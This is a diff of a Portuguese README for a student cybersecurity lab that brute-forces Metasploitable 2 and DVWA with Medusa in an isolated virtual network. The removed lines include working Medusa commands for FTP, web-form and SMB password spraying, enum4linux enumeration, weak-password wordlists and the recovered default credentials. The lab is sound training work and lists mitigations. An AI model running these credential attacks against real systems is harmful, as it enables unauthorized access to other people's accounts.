@@ -1,208 +1,98 @@
-# Ataques de Força Bruta com Medusa – Laboratório Prático (Kali Linux, Metasploitable 2 e DVWA)
 
-Este repositório contém a implementação do desafio prático da Pós-Graduação em Cibersegurança da DIO + Santander, utilizando técnicas de força bruta com a ferramenta Medusa em um ambiente totalmente controlado, seguro e isolado.
+# Ataques de Força Bruta com Medusa – Laboratório Prático (Kali Linux + Metasploitable 2)
 
-==================================================
-1. Ambiente Utilizado
-==================================================
+Este projeto implementa um laboratório completo para estudo de ataques de força bruta utilizando **Kali Linux**, **Medusa**, **Metasploitable 2**, **DVWA**, enumeração SMB e técnicas de password spraying.  
+Inclui documentação detalhada, prints de cada etapa, mitigações recomendadas, scripts auxiliares e wordlists customizadas.
 
-1.1. Máquinas Virtuais
-- Kali Linux
-- Metasploitable 2
-- DVWA – Damn Vulnerable Web Application (integrado ao Metasploitable)
-
-1.2. Hypervisor
-Todo o laboratório foi criado e executado utilizando:
-- VMware Workstation
-
-==================================================
-2. Configuração de Rede
-==================================================
-
-As VMs foram configuradas na mesma rede virtual, garantindo comunicação direta e isolamento do ambiente.
-
-Endereçamento utilizado:
-
-Máquina                IP
----------------------  ---------------
-Kali Linux             192.168.88.128
-Metasploitable 2       192.168.88.129
-Host (Windows)         192.168.88.1   (acesso via Termius)
-
-O acesso às VMs foi facilitado utilizando o Termius, permitindo trabalhar diretamente via SSH.
-
-Teste de conectividade (a partir do Kali):
-
-ping 192.168.88.129
-
-==================================================
-3. Reconhecimento Inicial (Nmap)
-==================================================
-
-O primeiro passo foi identificar serviços vulneráveis expostos pelo Metasploitable:
-
-nmap -sV -p- 192.168.88.129
-
-Principais serviços descobertos:
-- FTP (21)
-- SSH (22)
-- Telnet (23)
-- HTTP / DVWA (80)
-- SMB (139/445)
-- MySQL (3306)
-
-==================================================
-4. Wordlists Utilizadas
-==================================================
-
-Foram utilizadas wordlists simples para fins didáticos.
-
-wordlists/users.txt
--------------------
-admin
-user
-msfadmin
-postgres
-
-wordlists/passwords.txt
------------------------
-123456
-password
-msfadmin
-admin
-toor
-
-==================================================
-5. Ataque de Força Bruta – FTP
-==================================================
-
-O serviço FTP do Metasploitable é propositalmente vulnerável.
-
-Comando utilizado no Kali:
-
-medusa -h 192.168.88.129 -u msfadmin -P wordlists/passwords.txt -M ftp
-
-Resultado esperado:
-
-Usuário: msfadmin
-Senha:   msfadmin
-
-Validação do acesso via FTP:
-
-ftp 192.168.88.129
-
-==================================================
-6. Ataque ao Formulário de Login – DVWA (HTTP)
-==================================================
-
-A DVWA estava acessível via navegador em:
-
-http://192.168.88.129/DVWA/login.php
-
-Configurações utilizadas:
-- Security Level: LOW
-- Usuário padrão: admin
-
-Comando Medusa para o formulário de login:
-
-medusa -h 192.168.88.129 -u admin -P wordlists/passwords.txt ^
-  -M web-form -m FORM:"/DVWA/login.php" ^
-  -m FORM-DATA:"username=&password=&Login=Login" ^
-  -m DENY-SIGNAL:"Login failed"
-
-(Em Linux, remova os caracteres ^ de quebra de linha e deixe o comando em uma única linha ou use barra invertida.)
-
-Resultado esperado:
-
-Senha encontrada: password
-
-==================================================
-7. Password Spraying + Enumeração SMB
-==================================================
-
-7.1. Enumeração de usuários
-
-Utilizando o enum4linux para identificar usuários expostos:
-
-enum4linux -U 192.168.88.129
-
-Exemplos de usuários encontrados:
-- msfadmin
-- user
-- postgres
-
-7.2. Password spraying com Medusa
-
-Tentativa de usar a mesma senha para múltiplos usuários:
-
-medusa -h 192.168.88.129 -U wordlists/users.txt -p msfadmin -M smbnt
-
-Resultado esperado:
-
-msfadmin : msfadmin
-
-==================================================
-8. Mitigações Recomendadas
-==================================================
-
-FTP
 ---
-- Substituir FTP por SFTP.
-- Habilitar mecanismos de bloqueio por tentativas (ex.: fail2ban).
-- Remover ou restringir logins anônimos.
 
-Aplicações Web (como DVWA)
---------------------------
-- Implementar CAPTCHA em formulários de autenticação.
-- Aplicar rate limiting por IP.
-- Exibir mensagens de erro neutras (sem indicar se o usuário existe).
-- Implementar bloqueio progressivo após múltiplas tentativas.
+## 1. Arquitetura do Ambiente
 
-SMB
+Ambiente montado em **VMware Workstation** com rede **Host-Only**.
+
+- **Kali Linux:** 192.168.88.128  
+- **Metasploitable 2:** 192.168.88.129  
+- **Host (Windows) com Termius:** 192.168.88.1  
+
+Kali recebeu uma **segunda interface (eth1)** configurada em NAT para permitir acesso ao GitHub durante o desenvolvimento.
+
 ---
-- Adotar políticas de senhas fortes e expiração periódica.
-- Desativar SMBv1.
-- Habilitar SMB Signing.
-- Monitorar e registrar tentativas falhas de autenticação.
 
-==================================================
-9. Reflexões e Aprendizados
-==================================================
+## 2. Estrutura do Repositório
 
-Durante este laboratório, foi possível consolidar:
-
-- Uso prático do Medusa em múltiplos protocolos (FTP, HTTP, SMB).
-- Identificação de serviços vulneráveis com Nmap.
-- Enumeração de usuários em serviços SMB com enum4linux.
-- Entendimento de vulnerabilidades clássicas em FTP, SMB e aplicações web.
-- Importância de realizar testes em ambientes isolados para segurança ofensiva.
-- Aplicação de técnicas de mitigação e hardening após a identificação das falhas.
-- Organização e documentação técnica em um repositório GitHub como portfólio profissional.
-
-==================================================
-10. Estrutura Sugerida do Repositório
-==================================================
-
-medusa-labs-kali/
-├── README.md
-├── wordlists/
-│   ├── users.txt
-│   └── passwords.txt
+```
+medusa-kali-bruteforce-labs/
+├── images/
 ├── scripts/
-│   └── smb_enum.sh
-└── images/
-    ├── nmap.png
-    ├── ftp-medusa.png
-    ├── dvwa-medusa.png
-    └── smb-medusa.png
+├── wordlists/
+└── README.md
+```
 
-==================================================
-11. Conclusão
-==================================================
+---
 
-Este projeto demonstra:
+## 3. Controle de Versão (Git Workflow)
 
-- Domínio prático de ataques de força bruta em ambiente controlado.
-- Capacidade de exploração responsável de serviços vulneráveis.
-- Conhecimento de contramedidas para FTP, serviços web e SMB.
-- Habilidade de documentar e compartilhar resultados de forma organizada no GitHub.
+Inclui:
+
+- Configuração e identificação do Git  
+- Detecção de mudanças (GitHub Desktop)  
+- Commit e push de arquivos e imagens de evidência  
+- Versionamento da estrutura do projeto  
+- Clone do repositório diretamente no Kali Linux  
+- Acompanhamento de alterações usando `git status`  
+
+---
+
+## 4. Wordlists Customizadas
+
+**users.txt** reúne combinações típicas encontradas em serviços vulneráveis.  
+**pass.txt** contém senhas fracas comuns e variações reais.
+
+---
+
+## 5. Reconhecimento Inicial (Nmap)
+
+Exemplo utilizado:
+
+```
+nmap -sV -p- 192.168.88.129
+```
+
+---
+
+## 6. Ataques de Força Bruta
+
+Inclui:
+
+- FTP com Medusa  
+- Formulário Web DVWA (modo Low Security)  
+- SMB – password spraying e enumeração de usuários  
+- Scripts auxiliares para automação  
+
+---
+
+## 7. Mitigações Recomendadas
+
+- Políticas de senha fortes  
+- MFA  
+- Bloqueio após tentativas inválidas  
+- Firewall e permissões por IP  
+- Monitoramento contínuo (fail2ban/SIEM)  
+- Hardening de serviços  
+
+---
+
+## 8. Conclusão
+
+Laboratório completo, realista e totalmente documentado, servindo como base sólida para estudos em:
+
+- Pentest ofensivo  
+- Cibersegurança  
+- Hardening  
+- Auditoria de autenticação  
+- Domínio de Git em ambientes Windows e Linux  
+
+---
+
+Autor: **Edson Caetano Jr.**  
+Repositório: https://github.com/edsonblackjr/medusa-kali-bruteforce-labs
